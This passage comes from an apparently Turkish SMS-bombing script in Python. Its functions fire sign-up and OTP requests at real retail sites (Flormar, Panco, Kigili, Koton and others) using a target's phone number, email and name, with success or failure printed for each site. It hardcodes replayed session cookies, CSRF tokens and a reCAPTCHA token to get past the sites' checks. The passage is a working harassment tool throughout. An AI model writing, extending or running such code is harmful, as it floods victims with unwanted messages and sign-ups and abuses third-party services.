                'wis_i_73927': '242085',
                'wis_i_76710': '251381',
                '_sgf_exp': '',
                'OptanonAlertBoxClosed': '2024-02-26T20:30:25.705Z',
                'OptanonConsent': 'isGpcEnabled=0&datestamp=Mon+Feb+26+2024+23%3A30%3A25+GMT%2B0300+(GMT%2B03%3A00)&version=202304.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=fcedf322-0fc2-4ccd-93bd-8d96e6635fce&interactionCount=1&landingPath=NotLandingPage&groups=C0003%3A1%2CC0001%3A1%2CC0002%3A0%2CC0004%3A0',
                'wis_v': '1708979387930|2|list|1',
                }

                headers = {
                'authority': 'www.flormar.com.tr',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json',
                # 'cookie': 'csrftoken=jmZh0H2GPf0Fta7ghV7YlrmmfsrL49DwetqqrUHEfwSaCkPuXtjjUXhOZUEdHKw9; sessionid=fnv6mwf5yzojqrpj8d85yxunhlgzjcjn; _sgf_user_id=-428903741166993407; _sgf_session_id=-428903741166993408; wis_u=d50ed40a-7690-d8c3-b377-51de97c05a29|1708979387930|1|||63; wis_l_1553=1; wis_i_76819=251768; wis_i_70901=231293; wis_i_74277=243257; wis_i_74547=244146; wis_i_76423=250266; wis_i_73927=242085; wis_i_76710=251381; _sgf_exp=; OptanonAlertBoxClosed=2024-02-26T20:30:25.705Z; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Feb+26+2024+23%3A30%3A25+GMT%2B0300+(GMT%2B03%3A00)&version=202304.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=fcedf322-0fc2-4ccd-93bd-8d96e6635fce&interactionCount=1&landingPath=NotLandingPage&groups=C0003%3A1%2CC0001%3A1%2CC0002%3A0%2CC0004%3A0; wis_v=1708979387930|2|list|1',
                'origin': 'https://www.flormar.com.tr',
                'referer': 'https://www.flormar.com.tr/users/auth/?next=/makyaj/&_gl=1*1vuehze*_up*MQ..*_ga*MjYyNDg3MzcwLjE3MDg5NzkzODk.*_ga_29D6S6EGS6*MTcwODk3OTM4OC4xLjAuMTcwODk3OTM4OC4wLjAuMA..',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-csrftoken': '1PZAJp4p1CEaV0xcWRqYARTMTz7Sc5pOWWqJaCJnrTwF4afqCpCj9nOeD1kkPGir',
                'x-kl-kis-ajax-request': 'Ajax_Request',
                }

                json_data = {
                'email': f'{mail}',
                'first_name': f'{ad}',
                'last_name': f'{soyad}',
                'date_of_birth': '2000-01-19',
                'password': 'bLzZtjB6mXAm_5',
                'phone': f'0{phone}',
                'sms_allowed': True,
                'email_allowed': True,
                'confirm': True,
                }
                                                        
                response = requests.post('https://www.flormar.com.tr/users/register/', cookies=cookies, headers=headers, json=json_data)              
                
                print(Fore.LIGHTGREEN_EX + "[+]" + "Flormar ====> https://www.flormar.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Flormar Arıza"+ Style.RESET_ALL)   

    


    def panco():
        try:
                cookies = {
                    'pz-locale': 'tr',
                    'pz-currency': 'try',
                    '__Host-next-auth.csrf-token': 'ba40e942a6fd4964059d7e7d92060da7ee96f6bad2f8d26dfbbc16f25a79cef1%7C48de52ef3b3117ae3f3b4a7e394023a46b523bdb5fb99c21232d586ec7012131',
                    'csrftoken': 'ddkSUBUB76tzNtYlB1uITKnZixR9cohxvkLfAr3h9m1VHwOXAUlTZEM6Zj2JXIxb',
                    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.panco.com.tr%2F',
                }

                headers = {
                    'accept': '*/*',
                    'accept-language': 'tr-TR,tr;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    # 'cookie': 'pz-locale=tr; pz-currency=try; __Host-next-auth.csrf-token=ba40e942a6fd4964059d7e7d92060da7ee96f6bad2f8d26dfbbc16f25a79cef1%7C48de52ef3b3117ae3f3b4a7e394023a46b523bdb5fb99c21232d586ec7012131; csrftoken=ddkSUBUB76tzNtYlB1uITKnZixR9cohxvkLfAr3h9m1VHwOXAUlTZEM6Zj2JXIxb; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.panco.com.tr%2F',
                    'origin': 'https://www.panco.com.tr',
                    'priority': 'u=1, i',
                    'referer': 'https://www.panco.com.tr/users/auth',
                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                }

                data = {
                    'redirect': 'false',
                    'callbackUrl': '/',
                    'captchaValidated': 'false',
                    'email': f'{mail}',
                    'phone': f'0{phone}',
                    'first_name': f'{ad}',
                    'last_name': f'{soyad}',
                    'formType': 'register',
                    'locale': 'tr',
                    'password': 'Asd2s_',
                    'confirm': 'true',
                    'kvkk_confirm': 'true',
                    'email_allowed': 'true',
                    'sms_allowed': 'true',
                    'csrfToken': 'ba40e942a6fd4964059d7e7d92060da7ee96f6bad2f8d26dfbbc16f25a79cef1',
                    'json': 'true',
                }

                response = requests.post('https://www.panco.com.tr/api/auth/callback/default', cookies=cookies, headers=headers, data=data)
                print(Fore.LIGHTGREEN_EX + "[+]" + "Panco ====> https://www.panco.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Panco Arıza"+ Style.RESET_ALL)
    def ardenmarket():
        try:
                cookies = {
                'PHPSESSID': 'qkpshkc0dhqgfop6lit9i4p8je',
                'form_key': 'M06gVoO6Mrp4pctN',
                'mage-cache-storage': '{}',
                'mage-cache-storage-section-invalidation': '{}',
                'mage-cache-sessid': 'true',
                'recently_viewed_product': '{}',
                'recently_viewed_product_previous': '{}',
                'recently_compared_product': '{}',
                'recently_compared_product_previous': '{}',
                'product_data_storage': '{}',
                'form_key': 'M06gVoO6Mrp4pctN',
                '_ga': 'GA1.1.377216615.1708976973',
                '_ga_BHBTY3CSQB': 'GS1.1.1708976972.1.0.1708976972.60.0.0',
                'mage-messages': '',
                '_fbp': 'fb.2.1708976988053.621507432',
                'private_content_version': 'cfacb1c9ad451ec93be51ba5153737cf',
                'section_data_ids': '{}',
                }

                headers = {
                'authority': 'ardenmarket.com.tr',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'PHPSESSID=qkpshkc0dhqgfop6lit9i4p8je; form_key=M06gVoO6Mrp4pctN; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=M06gVoO6Mrp4pctN; _ga=GA1.1.377216615.1708976973; _ga_BHBTY3CSQB=GS1.1.1708976972.1.0.1708976972.60.0.0; mage-messages=; _fbp=fb.2.1708976988053.621507432; private_content_version=cfacb1c9ad451ec93be51ba5153737cf; section_data_ids={}',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMzMjE2NTYiLCJhcCI6IjUzODU2Nzc3NiIsImlkIjoiODc0ZmM3MmVlZDFhZGY2OCIsInRyIjoiN2U2NGQ0NzQ5YzQ1ODdhZmU0YjY3NmUwZDI2ZDk1MTYiLCJ0aSI6MTcwODk3NzAwNTk1Mn19',
                'origin': 'https://ardenmarket.com.tr',
                'referer': 'https://ardenmarket.com.tr/customer/account/create/',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-7e64d4749c4587afe4b676e0d26d9516-874fc72eed1adf68-01',
                'tracestate': '3321656@nr=0-1-3321656-538567776-874fc72eed1adf68----1708977005952',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-kl-kis-ajax-request': 'Ajax_Request',
                'x-newrelic-id': 'VwUFUFBWDhAEVlVSBAABUlQ=',
                'x-requested-with': 'XMLHttpRequest',
                }





                data = {
                'form_key': 'M06gVoO6Mrp4pctN',
                'email_validator': f'{mail}',
                'mobile_number': f'+90{phone}',
                }

                response = requests.post(
                'https://ardenmarket.com.tr/otplogin/account/otpregisterpost/',
                cookies=cookies,
                headers=headers,
                data=data,
                )
                print(Fore.LIGHTGREEN_EX + "[+]" + "ArdenMarket ====> https://ardenmarket.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "ArdenMarket Arıza"+ Style.RESET_ALL)     
                           
    def ozdilekteyim():
        try :
                headers = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                # Already added when you pass json=
                # 'Content-Type': 'application/json',
                'Origin': 'https://www.ozdilekteyim.com',
                'Referer': 'https://www.ozdilekteyim.com/market/login/register',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'X-Anonymous-Consents': '%5B%5D',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                }
                json_data = {}
                response = requests.post(
                f'https://api.ozdilekteyim.com/rest/v2/market-gecit-store/sms/anonymous/sendotp?phoneNumber={phone}&eventType=register&emailAddress={mail}&lang=tr&curr=TRY',
                headers=headers,
                json=json_data,
                )
                print(Fore.LIGHTGREEN_EX + "[+]" + "Ozdilek ====> https://ozdilekteyim.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Ozdilek Arıza"+ Style.RESET_ALL) 
    def atasay():
        try:
                cookies = {
                'csrftoken': 'mUdQ7Dr6uLKi7voeukqKOd5WWIlUZwZJ30YQSTLZ9jJTYZnmNPQKtsNbCByOFd3L',
                'sessionid': 'l32hbmin7s4br0ddw67bosvq6s403smw',
                '_ga': 'GA1.1.1730242733.1709034114',
                '_ga_HSNNRSVT34': 'GS1.1.1709034111.1.1.1709034270.0.0.0',
                }

                headers = {
                'authority': 'www.atasay.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json;charset=UTF-8',
                # 'cookie': 'csrftoken=mUdQ7Dr6uLKi7voeukqKOd5WWIlUZwZJ30YQSTLZ9jJTYZnmNPQKtsNbCByOFd3L; sessionid=l32hbmin7s4br0ddw67bosvq6s403smw; _ga=GA1.1.1730242733.1709034114; _ga_HSNNRSVT34=GS1.1.1709034111.1.1.1709034270.0.0.0',
                'origin': 'https://www.atasay.com',
                'referer': 'https://www.atasay.com/users/auth/?next=/tr/pirlanta/',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-csrftoken': 'EjWYpCCOeWPmHH6VSlf1O53TNlGbWNpWlpHYaSWHTuOXyb53bQF1tkL8teT5CutY',
                'x-kl-kis-ajax-request': 'Ajax_Request',
                }
                json_data = {
                'email': f'{mail}',
                'first_name': f'{ad}',
                'last_name': f'{soyad}',
                'password': 'aqBg9yG9pR*gb',
                'phone': f'0{phone}',
                'sms_allowed': True,
                'attributes': {
                'call_allowed': True,
                },
                'email_allowed': True,
                'confirm': True,
                'nationality': 'TR',
                'language': 'TR',
                'corr_language': 'TR',
                }
                response = requests.post('https://www.atasay.com/users/register/', cookies=cookies, headers=headers, json=json_data)    
                print(Fore.LIGHTGREEN_EX + "[+]" + "Atasay ====> https://www.atasay.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Atasay Arıza"+ Style.RESET_ALL) 
    def Komagene():
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            json={"Telefon": phone,"FirmaId": "32"}
            headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
            r = requests.post(url=url, headers=headers, json=json)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Komagene ====> https://komagene.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Komagene Arıza"+ Style.RESET_ALL)
    def damattween():
        try:          
                headers = {
                'authority': 'www.damattween.com',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'csrftoken=OA3Vu89neYD5BTAikKLaAV1ggLI9uiYssB8UZU7y6RgJ24bGNTpscWsHyhnwkJxa; usizy.sk=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0YTU2MmU3NGQ1NmExMWVlODdlODBhYzBmYWE4MWMyOCJ9.Qdss3s4JOdkZ9POH0QHWe9CR5BNlwg574kIL1CBWTCE; sessionid=x1klxg6q2y2ggnnwxj84maduf12d9gol; ccpa=ba34ef18-dd69-d514-0345-bda13afe47cb; _ym_uid=1709036295902486672; _ym_d=1709036295; _gcl_au=1.1.2015983335.1709036299; _ga=GA1.1.1376554478.1709036294; ccpu=PksCYK86NKFY.1709036298; cookie_consent_user_accepted=true; _fbp=fb.1.1709036299984.973991834; VLCV1OK=1; OfferMiner_ID=MGQWLVJVZIENWYSW20240227151820; _tt_enable_cookie=1; _ttp=1skYfLZB1KtU3gNkbHUczAVhsb4; osessionid=rzf5sfr5zjctilg3zz6fit7ra94su6l1; _ExVID=undefined; cto_bundle=a_7TYl9lUVlyZ3l6NVhQcmE3cGt6azBWVlNXOUlEQXpBT2ZEQzU4c2FHYnFhalRBZjBzRUFPbXBsbEtPbE8lMkJpbW1DSVNjZ3B4RHFTdlloRk9QQnhZc2x1Z29sRFdoRVNkYWdXUmJPUkN6SXdnZDhvZGN3NndXJTJGcU1vR3B0dURXZ3FJa3UlMkJrbDVKTW4lMkZSUllQWUdWSDJoY0hQQkRMWll2bVZFbVZheUFKcUdIQWR5S1NMdlNJcE95N1klMkZMVWVwNVpqajVab1dRJTJGaVFoUE1ERm5YSms2eHI5MElnJTNEJTNE; cookie_consent_level=%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D; _ga_B9DFNR33V8=GS1.1.1709124096.3.0.1709124096.60.0.0; VL_CM_0=%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-02-28%252015%253A41%253A36%22%2C%22E%22%3A%222026-02-17%2015%3A41%3A36%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%2292%22%2C%22E%22%3A%222026-02-17%2015%3A41%3A36%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-02-27%252015%253A18%253A20%22%2C%22E%22%3A%222026-02-16%2015%3A18%3A20%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%2211%22%2C%22E%22%3A%222026-02-17%2015%3A41%3A36%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222026-02-17%2015%3A41%3A36%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22MGQWLVJVZIENWYSW20240227151820%22%2C%22E%22%3A%222026-02-16%2015%3A18%3A20%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2015%3A18%3A20%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.damattween.com%252Fusers%252Flogin%252F%22%2C%22E%22%3A%222026-02-16%2022%3A58%3A16%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-02-17%2015%3A41%3A37%22%7D%2C%7B%22K%22%3A%22VL_LastVisitTime%22%2C%22V%22%3A%222024-02-28%252015%253A41%253A36%22%2C%22E%22%3A%222026-02-17%2015%3A41%3A36%22%7D%2C%7B%22K%22%3A%22VL_FirstReferrer%22%2C%22V%22%3A%22https%253A%252F%252Fwww.google.com%252F%22%2C%22E%22%3A%222024-03-28%2022%3A57%3A44%22%7D%2C%7B%22K%22%3A%22_ExVID%22%2C%22V%22%3A%22undefined%22%2C%22E%22%3A%222026-02-17%2015%3A41%3A36%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-02-28%252015%253A41%253A36%22%2C%22E%22%3A%222024-02-28%2016%3A11%3A36%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-28%2016%3A11%3A36%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-02-28%252015%253A41%253A36%22%2C%22E%22%3A%222024-02-28%2016%3A11%3A36%22%7D%2C%7B%22K%22%3A%22VL_PreviousVisitTime%22%2C%22V%22%3A%222024-02-27%252022%253A57%253A44%22%2C%22E%22%3A%222026-02-17%2015%3A41%3A36%22%7D%2C%7B%22K%22%3A%22VL_LastVisitResumes%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-28%2016%3A11%3A36%22%7D%5D%7D; _clck=om8dlg%7C2%7Cfjn%7C0%7C1518; _ym_isad=2; _clsk=1xld81f%7C1709124098031%7C1%7C1%7Cw.clarity.ms%2Fcollect',
                'origin': 'https://www.damattween.com',
                'referer': 'https://www.damattween.com/users/register/',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-csrftoken': 'FGF9ezKunLGnWQnCIiLjOm0M1nBajBRAjHK8JlIFfEj1n1Y0brpBqnrdjTgx92qi',
                'x-requested-with': 'XMLHttpRequest',
                }
                data = {
                'email': f'{mail}',
                'first_name': f'{ad}',
                'last_name': f'{soyad}',
                'password': 'tmm.jSTfjvY5R',
                'phone': f'0{phone}',
                'confirm': 'true',
                'email_allowed': 'true',
                'sms_allowed': 'true',
                }

                response = requests.post('https://www.damattween.com/users/register/', headers=headers, data=data)
                print(Fore.LIGHTGREEN_EX + "[+]" + "Damattween ====> https://www.damattween.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Damattween Arıza"+ Style.RESET_ALL) 

    def kigili():
        try:
                cookies = {
                'csrftoken': 'YSepmLWWFfKG5P0dMwfLqO7gTFDFas1gKokQzE8kiEFs3xzIPCV9Fi9BPiA5Fq6n',
                'ccpa': 'faf3ff5f-1afb-5cdc-b6b3-557e5f67ef7c',
                'ccpu': 'KRyKho2t6OgO.1708798285',
                'cookie_consent_user_accepted': 'true',
                '_ga': 'GA1.1.1428248968.1709047735',
                'strw-1934-vt': '0_1709047734891',
                '_fbp': 'fb.1.1709047734943.382561838',
                '_sgf_user_id': '-3581422920392851455',
                '_sgf_session_id': '-3581422920392851456',
                '_sgf_exp': '',
                'ajs_group_id': 'null',
                'ajs_user_id': '%22None%22',
                'ajs_anonymous_id': '%225b4d25a6-db5b-4de1-8601-a2e868887dee%22',
                '_gcl_au': '1.1.681231338.1709047893',
                'cookie_consent_level': '%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D',
                '_ga_E94281GKS9': 'GS1.1.1709047734.1.1.1709047895.58.0.0',
                'strw-1934-tpvc': '2',
                'strw-1934-spvc': '2',
                'cto_bundle': 'WG_MvV9lRiUyRnZhWmNPS2hXckVneU4zZ2Y5allrV1NsS1lWbW1zdVpzb3c0S1E5ZTNuWEx3ZFpJcXZVbG1nVGNRVnVPSmszVXZpN2MxSHBEWFVxSWFFaEJpMEttSWgwSkxTaUFJJTJCTFFRWHhZMFMxb2Z0VVFkb0Q4elJsc0VqUk5MYUZnQiUyQjN6bktER1FZMGVOJTJGNUJmYiUyRnBuSVBkZm5WYmVEeVBnWkluTWRqeDU5emIlMkY4M0ZzJTJCSDdOUTA3VnBSY05XalF4aUxCS2VSbENzMGo3aGZwWTJJeUhFMHclM0QlM0Q',
                'strw-1934-ttt': '156',
                'strw-1934-stt': '156',
                'strw-1934-ptt': '24',
                }
                headers = {
                'authority': 'www.kigili.com',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'csrftoken=YSepmLWWFfKG5P0dMwfLqO7gTFDFas1gKokQzE8kiEFs3xzIPCV9Fi9BPiA5Fq6n; ccpa=faf3ff5f-1afb-5cdc-b6b3-557e5f67ef7c; ccpu=KRyKho2t6OgO.1708798285; cookie_consent_user_accepted=true; _ga=GA1.1.1428248968.1709047735; strw-1934-vt=0_1709047734891; _fbp=fb.1.1709047734943.382561838; _sgf_user_id=-3581422920392851455; _sgf_session_id=-3581422920392851456; _sgf_exp=; ajs_group_id=null; ajs_user_id=%22None%22; ajs_anonymous_id=%225b4d25a6-db5b-4de1-8601-a2e868887dee%22; _gcl_au=1.1.681231338.1709047893; cookie_consent_level=%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D; _ga_E94281GKS9=GS1.1.1709047734.1.1.1709047895.58.0.0; strw-1934-tpvc=2; strw-1934-spvc=2; cto_bundle=WG_MvV9lRiUyRnZhWmNPS2hXckVneU4zZ2Y5allrV1NsS1lWbW1zdVpzb3c0S1E5ZTNuWEx3ZFpJcXZVbG1nVGNRVnVPSmszVXZpN2MxSHBEWFVxSWFFaEJpMEttSWgwSkxTaUFJJTJCTFFRWHhZMFMxb2Z0VVFkb0Q4elJsc0VqUk5MYUZnQiUyQjN6bktER1FZMGVOJTJGNUJmYiUyRnBuSVBkZm5WYmVEeVBnWkluTWRqeDU5emIlMkY4M0ZzJTJCSDdOUTA3VnBSY05XalF4aUxCS2VSbENzMGo3aGZwWTJJeUhFMHclM0QlM0Q; strw-1934-ttt=156; strw-1934-stt=156; strw-1934-ptt=24',
                'origin': 'https://www.kigili.com',
                'referer': 'https://www.kigili.com/register/?next=/',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                }

                data = {
                'first_name': f'{ad}',
                'last_name': f'{soyad}',
                'email': f'{mail}',
                'phone': f'0{phone}',
                'password': 'RvjPc+jQ368Hx',
                'email_allowed': 'true',
                'sms_allowed': 'true',
                'confirm': 'true',
                'kvkk': 'true',
                'next': '/',
                'g-recaptcha-response': '03AFcWeA4TpuWzTZB4Rg9y2e32OfWmf7TNkkvwL1WH4tMLRDs8J9ll2zbBe-VEjWhNaxNwCGNqDePIc9Wg02T0rxXlAbYmfoos8oARd48dwQQ80T9tYRNplzPDIY5djrB0zllyB_EjaghOtsJGM1SvOIrgSKz9X8nPwUQyLfqOhULA4krieb2FHrFSojqOz_pTS74HjYbKljb6paXFNZL0Bhl6yf8YY5REVOrIWHtp8u8gzZyp9X73ZieKx8Xs96Ag4q0HnnqXy84A2iJm1IL-8AG9rSwrvI2bKFASmJR1PJrMScSKPXcmN2yJ6Q-qMxrXy9MURweNk4GQ8m-bYBgTsMRkX7JvEseLiD5rYwI9keb5ofArQvhzSI7Fu9ns4uQJaj8qY1CPPSV_b2NEaqAWeK12Aj08EiJ_Ni6qc_PTDCI6Vmf3HvBxfiZ2yBD-BQiSDLPbP0PIkG9k4Kb1TTsii1dd6xmBgZkjq7_X6nLKvNtbwBn1A8LnmREgckNjyRroY5rxmzOS-imA89kh7GN-OmUxsY0xiCJqM7CRgDZ2APEjD5JgTH-BrNwgubqPW2x_ZmSCVnrpGedUhe-qDuPRMinn4_O3p4YwdaeF4Wy0UiwSZb1NQCEXXXMooqtsVVw_Q-Q3xi81U5r1LSM75Ko-lDkWnYyKPRyZ6IDjYTHFthk6ChqowICBAnY',
                }
                response = requests.post('https://www.kigili.com/users/registration/', cookies=cookies, headers=headers, data=data)
                print(Fore.LIGHTGREEN_EX + "[+]" + "Kigili ====> https://www.kigili.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Kigili Arıza"+ Style.RESET_ALL)
    def koton():
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; 